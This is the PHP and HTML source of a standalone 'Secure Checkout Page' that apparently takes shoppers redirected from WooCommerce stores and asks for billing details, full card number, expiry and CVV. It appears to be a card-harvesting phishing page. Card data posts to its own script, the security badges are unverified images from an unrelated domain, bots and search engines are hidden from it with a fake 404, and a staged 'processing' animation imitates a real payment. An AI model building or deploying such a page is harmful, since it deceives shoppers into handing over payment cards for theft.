<?php
// Parse URL path for WooCommerce plugin format: /checkout/RESOURCE/TOTAL_CENTS/ORDER_ID/HASH
$request_uri = $_SERVER['REQUEST_URI'] ?? '';
$path_parts = explode('?', $request_uri)[0]; // Remove query string
$segments = explode('/', trim($path_parts, '/'));

// Extract path parameters if present
$resource = null;
$total_cents = null;
$path_order_id = null;
$hash = null;

if (count($segments) >= 5 && $segments[0] === 'checkout') {
    $resource = $segments[1] ?? null;
    $total_cents = $segments[2] ?? null;
    $path_order_id = $segments[3] ?? null;
    $hash = $segments[4] ?? null;
}

// WooCommerce payment gateway plugin numeric codes (ACTUAL MAPPING FROM PLUGIN)
$wc_country_codes = [
    '1' => 'AF', '2' => 'AL', '3' => 'DZ', '4' => 'AS', '5' => 'AD', '6' => 'AO', '7' => 'AI', '8' => 'AG',
    '9' => 'AR', '10' => 'AM', '11' => 'AW', '12' => 'AU', '13' => 'AT', '14' => 'AZ', '15' => 'BS', '16' => 'BH',
    '17' => 'BD', '18' => 'BB', '19' => 'BY', '20' => 'BE', '21' => 'BZ', '22' => 'BJ', '23' => 'BM', '24' => 'BT',
    '25' => 'BO', '26' => 'BA', '27' => 'BW', '28' => 'BR', '29' => 'IO', '30' => 'VG', '31' => 'BN', '32' => 'BG',
    '33' => 'BF', '34' => 'BI', '35' => 'KH', '36' => 'CM', '37' => 'CA', '38' => 'CV', '39' => 'KY', '40' => 'CF',
    '41' => 'TD', '42' => 'CL', '43' => 'CN', '44' => 'CX', '45' => 'CC', '46' => 'CO', '47' => 'KM', '48' => 'CG',
    '49' => 'CK', '50' => 'CR', '51' => 'HR', '52' => 'CU', '53' => 'CY', '54' => 'DK', '55' => 'DJ', '56' => 'DM',
    '57' => 'DO', '58' => 'TL', '59' => 'EC', '60' => 'EG', '61' => 'SV', '62' => 'GQ', '63' => 'ER', '64' => 'EE',
    '65' => 'ET', '66' => 'FO', '67' => 'FK', '68' => 'FJ', '69' => 'FI', '70' => 'FR', '71' => 'GF', '72' => 'TF',
    '73' => 'PF', '74' => 'GA', '75' => 'GM', '76' => 'GE', '77' => 'DE', '78' => 'GH', '79' => 'GI', '80' => 'GR',
    '81' => 'GL', '82' => 'GD', '83' => 'GP', '84' => 'GU', '85' => 'GT', '86' => 'GN', '87' => 'GW', '88' => 'GY',
    '89' => 'HT', '90' => 'HN', '91' => 'HU', '92' => 'IS', '93' => 'IN', '94' => 'ID', '95' => 'IR', '96' => 'IQ',
    '97' => 'IE', '98' => 'IL', '99' => 'IT', '100' => 'JM', '101' => 'JP', '102' => 'JO', '103' => 'KZ', '104' => 'KE',
    '105' => 'KI', '106' => 'KR', '107' => 'KW', '108' => 'KG', '109' => 'LV', '110' => 'LB', '111' => 'LS', '112' => 'LR',
    '113' => 'LY', '114' => 'LI', '115' => 'LT', '116' => 'LU', '117' => 'MO', '118' => 'MK', '119' => 'MG', '120' => 'MW',
    '121' => 'MY', '122' => 'MV', '123' => 'ML', '124' => 'MT', '125' => 'MH', '126' => 'MQ', '127' => 'MR', '128' => 'MU',
    '129' => 'YT', '130' => 'MX', '131' => 'FM', '132' => 'MD', '133' => 'MC', '134' => 'MN', '135' => 'MS', '136' => 'MA',
    '137' => 'MZ', '138' => 'MM', '139' => 'NA', '140' => 'NR', '141' => 'NP', '142' => 'NL', '143' => 'AN', '144' => 'NC',
    '145' => 'NZ', '146' => 'NI', '147' => 'NE', '148' => 'NG', '149' => 'NU', '150' => 'NF', '151' => 'MP', '152' => 'NO',
    '153' => 'OM', '154' => 'PK', '155' => 'PW', '156' => 'PA', '157' => 'PG', '158' => 'PY', '159' => 'PE', '160' => 'PH',
    '161' => 'PN', '162' => 'PL', '163' => 'PT', '164' => 'PR', '165' => 'QA', '166' => 'RE', '167' => 'RO', '168' => 'RU',
    '169' => 'RW', '170' => 'SH', '171' => 'KN', '172' => 'LC', '173' => 'PM', '174' => 'SM', '175' => 'ST', '176' => 'SA',
    '177' => 'SN', '178' => 'SC', '179' => 'SL', '180' => 'SG', '181' => 'SK', '182' => 'SI', '183' => 'SB', '184' => 'SO',
    '185' => 'ZA', '186' => 'GS', '187' => 'ES', '188' => 'LK', '189' => 'VC', '190' => 'SD', '191' => 'SR', '192' => 'SZ',
    '193' => 'SE', '194' => 'CH', '195' => 'SY', '196' => 'TW', '197' => 'TJ', '198' => 'TZ', '199' => 'TH', '200' => 'TG',
    '201' => 'TO', '202' => 'TT', '203' => 'TN', '204' => 'TR', '205' => 'TM', '206' => 'TC', '207' => 'TV', '208' => 'UG',
    '209' => 'UA', '210' => 'AE', '211' => 'GB', '212' => 'US', '213' => 'UY', '214' => 'UZ', '215' => 'VU', '216' => 'VA',
    '217' => 'VE', '218' => 'VN', '219' => 'VI', '220' => 'WF', '221' => 'EH', '222' => 'WS', '223' => 'YE', '224' => 'YU',
    '225' => 'ZM', '226' => 'ZW', '227' => 'CZ', '228' => 'HK'
];

// WooCommerce payment gateway plugin US state codes (ACTUAL MAPPING FROM PLUGIN)
$wc_state_codes = [
    '1' => 'AL', '2' => 'AK', '3' => 'AZ', '4' => 'AR', '5' => 'AA', '6' => 'AE', '7' => 'AP', '8' => 'CA',
    '9' => 'CO', '10' => 'CT', '11' => 'DE', '12' => 'DC', '13' => 'FL', '14' => 'GA', '15' => 'HI', '16' => 'ID',
    '17' => 'IL', '18' => 'IN', '19' => 'IA', '20' => 'KS', '21' => 'KY', '22' => 'LA', '23' => 'ME', '24' => 'MD',
    '25' => 'MA', '26' => 'MI', '27' => 'MN', '28' => 'MS', '29' => 'MO', '30' => 'MT', '31' => 'NE', '32' => 'NV',
    '33' => 'NH', '34' => 'NJ', '35' => 'NM', '36' => 'NY', '37' => 'NC', '38' => 'ND', '39' => 'OH', '40' => 'OK',
    '41' => 'OR', '42' => 'PA', '43' => 'RI', '44' => 'SC', '45' => 'SD', '46' => 'TN', '47' => 'TX', '48' => 'UT',
    '49' => 'VT', '50' => 'VA', '51' => 'WA', '52' => 'WV', '53' => 'WI', '54' => 'WY'
];

// Country name to code mapping
$country_mapping = [
    'United States' => 'US', 'United Kingdom' => 'GB', 'Canada' => 'CA', 'Australia' => 'AU',
    'Germany' => 'DE', 'France' => 'FR', 'Italy' => 'IT', 'Spain' => 'ES', 'Netherlands' => 'NL',
    'Belgium' => 'BE', 'Austria' => 'AT', 'Switzerland' => 'CH', 'Ireland' => 'IE', 'Sweden' => 'SE',
    'Norway' => 'NO', 'Denmark' => 'DK', 'Finland' => 'FI', 'Poland' => 'PL', 'Portugal' => 'PT', 'Greece' => 'GR'
];

// State name to code mapping (US states)
$state_mapping = [
    'Alabama' => 'AL', 'Alaska' => 'AK', 'Arizona' => 'AZ', 'Arkansas' => 'AR', 'California' => 'CA',
    'Colorado' => 'CO', 'Connecticut' => 'CT', 'Delaware' => 'DE', 'Florida' => 'FL', 'Georgia' => 'GA',
    'Hawaii' => 'HI', 'Idaho' => 'ID', 'Illinois' => 'IL', 'Indiana' => 'IN', 'Iowa' => 'IA',
    'Kansas' => 'KS', 'Kentucky' => 'KY', 'Louisiana' => 'LA', 'Maine' => 'ME', 'Maryland' => 'MD',
    'Massachusetts' => 'MA', 'Michigan' => 'MI', 'Minnesota' => 'MN', 'Mississippi' => 'MS', 'Missouri' => 'MO',
    'Montana' => 'MT', 'Nebraska' => 'NE', 'Nevada' => 'NV', 'New Hampshire' => 'NH', 'New Jersey' => 'NJ',
    'New Mexico' => 'NM', 'New York' => 'NY', 'North Carolina' => 'NC', 'North Dakota' => 'ND', 'Ohio' => 'OH',
    'Oklahoma' => 'OK', 'Oregon' => 'OR', 'Pennsylvania' => 'PA', 'Rhode Island' => 'RI', 'South Carolina' => 'SC',
    'South Dakota' => 'SD', 'Tennessee' => 'TN', 'Texas' => 'TX', 'Utah' => 'UT', 'Vermont' => 'VT',
    'Virginia' => 'VA', 'Washington' => 'WA', 'West Virginia' => 'WV', 'Wisconsin' => 'WI', 'Wyoming' => 'WY'
];

// Get URL parameters
$country_raw = $_GET['country'] ?? '';
$state_raw = $_GET['state'] ?? '';

// Convert country code - try WooCommerce numeric codes first, then name mapping, then use as-is
$country_code = $country_raw;
if (is_numeric($country_raw)) {
    // WooCommerce numeric code
    $country_code = $wc_country_codes[$country_raw] ?? $country_raw;
} elseif (strlen($country_raw) > 2) {
    // Country full name
    $country_code = $country_mapping[$country_raw] ?? $country_raw;
}

// Convert state code - try WooCommerce numeric codes first, then name mapping, then use as-is
$state_code = $state_raw;
if (is_numeric($state_raw)) {
    // WooCommerce numeric code
    $state_code = $wc_state_codes[$state_raw] ?? $state_raw;
} elseif (strlen($state_raw) > 2) {
    // State full name
    $state_code = $state_mapping[$state_raw] ?? $state_raw;
}

// Get URL parameters (GET params override path params)
$params = [
    'first_name' => $_GET['first_name'] ?? '',
    'last_name' => $_GET['last_name'] ?? '',
    'country' => $country_code,
    'state' => $state_code,
    'address' => $_GET['address'] ?? '',
    'city' => $_GET['city'] ?? '',
    'zip' => $_GET['zip'] ?? '',
    'email' => $_GET['email'] ?? '',
    'phone' => $_GET['phone'] ?? '',
    'total' => $_GET['total'] ?? $total_cents ?? '0',
    'order_id' => $_GET['id'] ?? $path_order_id ?? '',
    'item_name' => $_GET['item_name'] ?? 'Order #' . ($path_order_id ?? ''),
    'success' => $_GET['success'] ?? '',
    'failure' => $_GET['failure'] ?? '',
    'back' => $_GET['back'] ?? '#',
    'resource' => $resource,
    'hash' => $hash,
    'store_id' => $_GET['store_id'] ?? ''
];

// Security: Block access to checkout page without required parameters
// This prevents bots and direct access - only allow access via WooCommerce plugin
$required_params = ['order_id', 'total', 'email'];
$has_required = false;

foreach ($required_params as $param) {
    if (!empty($params[$param])) {
        $has_required = true;
        break;
    }
}

if (!$has_required) {
    http_response_code(404);
    die('<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <h1>404 - Page Not Found</h1>
    <p>The page you are looking for does not exist.</p>
</body>
</html>');
}

$total = floatval($params['total']) / 100;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="googlebot" content="noindex, nofollow">
    <link rel="icon" type="image/png" href="https://online-bill.click/images/encrypted.png">
    <title>Secure Checkout Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #2d5aa0 0%, #1e3c72 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            max-width: 900px;
            width: 100%;
            padding: 30px;
            margin: 20px 0;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .header h1 {
            color: #2d5aa0;
            font-size: 24px;
            margin-bottom: 8px;
        }

        .header p {
            color: #666;
            font-size: 13px;
        }

        .order-summary {
            background: #f8f9fa;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 25px;
        }

        .order-summary table {
            width: 100%;
            border-collapse: collapse;
        }

        .order-summary th {
            background: #e9ecef;
            padding: 10px;
            text-align: left;
            font-weight: 600;
            color: #333;
            border-bottom: 2px solid #dee2e6;
        }

        .order-summary td {
            padding: 10px;
            border-bottom: 1px solid #e0e0e0;
        }

        .total-row {
            background: #2d5aa0;
            color: white;
            font-weight: 600;
            text-align: right;
        }

        .total-row td {
            border-bottom: none;
        }

        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
        }

        .form-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
        }

        .form-section h2 {
            color: #2d5aa0;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-size: 14px;
            font-weight: 500;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
            transition: border-color 0.3s;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #2d5aa0;
            box-shadow: 0 0 0 3px rgba(45, 90, 160, 0.1);
        }

        .required::after {
            content: " *";
            color: red;
        }

        .payment-logos {
            display: flex;
            gap: 15px;
            align-items: center;
            margin-bottom: 15px;
        }
        .security-logos {
            margin-top: 15px;
            justify-content: center;
        }

        .card-icon {
            height: 32px;
            width: auto;
            object-fit: contain;
            filter: drop-shadow(0 2px 3px rgba(0,0,0,0.1));
        }

        .payment-logo {
            padding: 5px 12px;
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-weight: 600;
            font-size: 12px;
        }

        .payment-logo.visa {
            color: #1a1f71;
        }

        .payment-logo.mastercard {
            color: #eb001b;
        }

        .row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: #2d5aa0;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 20px;
        }

        .submit-btn:hover {
            background: #1e3c72;
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .submit-btn:disabled {
            background: #6c757d;
            cursor: not-allowed;
        }

        /* Payment Processing Overlay */
        .payment-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .payment-overlay.active {
            display: flex;
        }

        .payment-loader {
            background: white;
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
        }

        .loader-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2d5aa0;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            color: #333;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .loader-subtext {
            color: #666;
            font-size: 14px;
        }

        .loader-steps {
            margin-top: 20px;
            text-align: left;
        }

        .loader-step {
            display: flex;
            align-items: center;
            padding: 8px 0;
            color: #999;
            font-size: 14px;
        }

        .loader-step.active {
            color: #2d5aa0;
            font-weight: 600;
        }

        .loader-step.completed {
            color: #28a745;
        }

        .loader-step-icon {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            border: 2px solid currentColor;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }

        .loader-step.completed .loader-step-icon::before {
            content: "✓";
        }

        .footer-note {
            text-align: center;
            margin-top: 15px;
            color: #666;
            font-size: 13px;
        }

        .back-link {
            text-align: center;
            margin-top: 20px;
        }

        .back-link a {
            color: #2d5aa0;
            text-decoration: none;
            font-size: 14px;
        }

        .back-link a:hover {
            text-decoration: underline;
        }

        .footer {
            color: white;
            text-align: center;
            margin-top: 20px;
            font-size: 13px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }

            .form-grid {
                grid-template-columns: 1fr;
                gap: 20px;
            }

            .header h1 {
                font-size: 20px;
            }

            .row {
                grid-template-columns: 1fr;
            }

            .order-summary {
                overflow-x: auto;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .container {
                padding: 15px;
            }

            .form-section {
                padding: 15px;
            }

            .header h1 {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SECURE CHECKOUT PAGE</h1>
            <p>Your data is safely encrypted and is safe</p>
        </div>

        <div class="order-summary">
            <table>
                <thead>
                    <tr>
                        <th>Item</th>
                        <th style="text-align: right;">Price (USD)</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><?= htmlspecialchars($params['order_id'] ?: $params['item_name']) ?></td>
                        <td style="text-align: right;">$ <?= number_format($total, 2) ?></td>
                    </tr>
                </tbody>
                <tfoot>
                    <tr class="total-row">
                        <td>Your order sum is:</td>
                        <td>$ <?= number_format($total, 2) ?></td>
                    </tr>
                </tfoot>
            </table>
        </div>

        <form id="checkout-form" method="POST" action="/process-payment.php">
            <!-- Hidden fields -->
            <input type="hidden" name="store_id" value="<?= htmlspecialchars($params['store_id']) ?>">
            <input type="hidden" name="order_id" value="<?= htmlspecialchars($params['order_id']) ?>">
            <input type="hidden" name="total" value="<?= htmlspecialchars($params['total']) ?>">
            <input type="hidden" name="success" value="<?= htmlspecialchars($params['success']) ?>">
            <input type="hidden" name="failure" value="<?= htmlspecialchars($params['failure']) ?>">
            <input type="hidden" name="back" value="<?= htmlspecialchars($params['back']) ?>">

            <div class="form-grid">
                <div class="form-section">
                    <h2>Billing Address</h2>

                    <div class="form-group">
                        <label class="required">First Name</label>
                        <input type="text" name="first_name" value="<?= htmlspecialchars($params['first_name']) ?>" required>
                    </div>

                    <div class="form-group">
                        <label class="required">Last name</label>
                        <input type="text" name="last_name" value="<?= htmlspecialchars($params['last_name']) ?>" required>
                    </div>

                    <div class="form-group">
                        <label class="required">State / Province</label>
                        <select name="state" required>
                            <option value="">Select State</option>
                            <?php
                            $states = [
                                'AL' => 'Alabama', 'AK' => 'Alaska', 'AZ' => 'Arizona', 'AR' => 'Arkansas', 'CA' => 'California',
                                'CO' => 'Colorado', 'CT' => 'Connecticut', 'DE' => 'Delaware', 'FL' => 'Florida', 'GA' => 'Georgia',
                                'HI' => 'Hawaii', 'ID' => 'Idaho', 'IL' => 'Illinois', 'IN' => 'Indiana', 'IA' => 'Iowa',
                                'KS' => 'Kansas', 'KY' => 'Kentucky', 'LA' => 'Louisiana', 'ME' => 'Maine', 'MD' => 'Maryland',
                                'MA' => 'Massachusetts', 'MI' => 'Michigan', 'MN' => 'Minnesota', 'MS' => 'Mississippi', 'MO' => 'Missouri',
                                'MT' => 'Montana', 'NE' => 'Nebraska', 'NV' => 'Nevada', 'NH' => 'New Hampshire', 'NJ' => 'New Jersey',
                                'NM' => 'New Mexico', 'NY' => 'New York', 'NC' => 'North Carolina', 'ND' => 'North Dakota', 'OH' => 'Ohio',
                                'OK' => 'Oklahoma', 'OR' => 'Oregon', 'PA' => 'Pennsylvania', 'RI' => 'Rhode Island', 'SC' => 'South Carolina',
                                'SD' => 'South Dakota', 'TN' => 'Tennessee', 'TX' => 'Texas', 'UT' => 'Utah', 'VT' => 'Vermont',
                                'VA' => 'Virginia', 'WA' => 'Washington', 'WV' => 'West Virginia', 'WI' => 'Wisconsin', 'WY' => 'Wyoming'
                            ];
                            foreach ($states as $code => $name) {
                                $selected = $params['state'] === $code ? 'selected' : '';
                                echo "<option value=\"$code\" $selected>$name</option>";
                            }
                            ?>
                        </select>
                    </div>

                    <div class="form-group">
                        <label class="required">Country</label>
                        <select name="country" required>
                            <option value="">Select Country</option>
                            <?php
                            $countries = [
                                'US' => 'United States', 'GB' => 'United Kingdom', 'CA' => 'Canada', 'AU' => 'Australia',
                                'DE' => 'Germany', 'FR' => 'France', 'IT' => 'Italy', 'ES' => 'Spain', 'NL' => 'Netherlands',
                                'BE' => 'Belgium', 'AT' => 'Austria', 'CH' => 'Switzerland', 'IE' => 'Ireland', 'SE' => 'Sweden',
                                'NO' => 'Norway', 'DK' => 'Denmark', 'FI' => 'Finland', 'PL' => 'Poland', 'PT' => 'Portugal', 'GR' => 'Greece'
                            ];
                            foreach ($countries as $code => $name) {
                                $selected = $params['country'] === $code ? 'selected' : '';
                                echo "<option value=\"$code\" $selected>$name</option>";
                            }
                            ?>
                        </select>
                    </div>

                    <div class="form-group">
                        <label class="required">Zip or postal code</label>
                        <input type="text" name="zip" value="<?= htmlspecialchars($params['zip']) ?>" required>
                    </div>

                    <div class="form-group">
                        <label class="required">City</label>
                        <input type="text" name="city" value="<?= htmlspecialchars($params['city']) ?>" required>
                    </div>

                    <div class="form-group">
                        <label class="required">Street address</label>
                        <input type="text" name="address" value="<?= htmlspecialchars($params['address']) ?>" required>
                    </div>

                    <div class="form-group">
                        <label class="required">Phone</label>
                        <input type="tel" name="phone" value="<?= htmlspecialchars($params['phone']) ?>" placeholder="(970) 464-9288" required>
                    </div>

                    <div class="form-group">
                        <label class="required">E-mail</label>
                        <input type="email" name="email" value="<?= htmlspecialchars($params['email']) ?>" required>
                    </div>
                </div>

                <div class="form-section">
                    <h2>Payment Information</h2>

                    <div class="payment-logos">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" class="card-icon" alt="Visa">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="card-icon" alt="Mastercard">
                        <img src="https://logo.svgcdn.com/logos/amex.svg" class="card-icon" alt="American Express">

                    </div>

                    <div class="form-group">
                        <label class="required">Credit card No</label>
                        <input type="text" name="card_number" id="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    </div>

                    <div class="row">
                        <div class="form-group">
                            <label class="required">Expiration date</label>
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                                <select name="exp_month" required>
                                    <option value="">MM</option>
                                    <?php for($i = 1; $i <= 12; $i++): ?>
                                        <option value="<?= sprintf('%02d', $i) ?>"><?= sprintf('%02d', $i) ?></option>
                                    <?php endfor; ?>
                                </select>
                                <select name="exp_year" required>
                                    <option value="">YYYY</option>
                                    <?php for($i = 0; $i < 15; $i++): ?>
                                        <option value="<?= date('Y') + $i ?>"><?= date('Y') + $i ?></option>
                                    <?php endfor; ?>
                                </select>
                            </div>
                        </div>

                        <div class="form-group">
                            <label class="required">CVC2/CVV2</label>
                            <input type="text" name="cvv" id="cvv" placeholder="000" maxlength="4" required>
                        </div>
                    </div>

                    <div class="footer-note">
                        Please note: fields marked with <span style="color: red;">*</span> are required to be filled in to complete your order
                    </div>

                    <input type="hidden" name="order_id" value="<?= htmlspecialchars($params['order_id']) ?>">
                    <input type="hidden" name="total" value="<?= htmlspecialchars($params['total']) ?>">
                    <input type="hidden" name="success" value="<?= htmlspecialchars($params['success']) ?>">
                    <input type="hidden" name="failure" value="<?= htmlspecialchars($params['failure']) ?>">
                    <input type="hidden" name="back" value="<?= htmlspecialchars($params['back']) ?>">

                    <button type="submit" class="submit-btn">Pay Now</button>
                    <div class="payment-logos security-logos"> 
                        <img src="https://online-bill.click/images/norton.png" class="card-icon" alt="Norton Secured">
                        <img src="https://online-bill.click/images/pci-dss.png" class="card-icon" alt="PCI DSS Compliant">
                    </div>
                </div>
            </div>
            
        </form>

        <div class="back-link">
            <a href="<?= htmlspecialchars($params['back']) ?>">← Back to the shop</a>
        </div>
    </div>

    <div class="footer">
        © 2025 All rights reserved.
    </div>

    <!-- Payment Processing Overlay -->
    <div class="payment-overlay" id="paymentOverlay">
        <div class="payment-loader">
            <div class="loader-spinner"></div>
            <div class="loader-text">Processing Payment...</div>
            <div class="loader-subtext">Please do not close this window</div>
            <div class="loader-steps">
                <div class="loader-step" id="step1">
                    <div class="loader-step-icon"></div>
                    <span>Validating card details</span>
                </div>
                <div class="loader-step" id="step2">
                    <div class="loader-step-icon"></div>
                    <span>Contacting payment processor</span>
                </div>
                <div class="loader-step" id="step3">
                    <div class="loader-step-icon"></div>
                    <span>Finalizing transaction</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('card_number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });

        document.getElementById('card_number').addEventListener('keypress', function(e) {
            if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                e.preventDefault();
            }
        });

        document.getElementById('cvv').addEventListener('keypress', function(e) {
            if (!/\d/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                e.preventDefault();
            }
        });

        // Payment processing animation
        const form = document.getElementById('checkout-form');
        const overlay = document.getElementById('paymentOverlay');
        const submitBtn = form.querySelector('.submit-btn');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // Disable button
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';

            // Show overlay
            overlay.classList.add('active');

            // Animate steps
            const steps = [
                { id: 'step1', delay: 500 },
                { id: 'step2', delay: 2000 },
                { id: 'step3', delay: 3500 }
            ];

            steps.forEach(step => {
                setTimeout(() => {
                    document.getElementById(step.id).classList.add('active');
                }, step.delay);

                setTimeout(() => {
                    document.getElementById(step.id).classList.remove('active');
                    document.getElementById(step.id).classList.add('completed');
                }, step.delay + 800);
            });

            // Submit form after 5.5 seconds
            setTimeout(() => {
                form.submit();
            }, 5500);
        });
    </script>
</body>
</html>
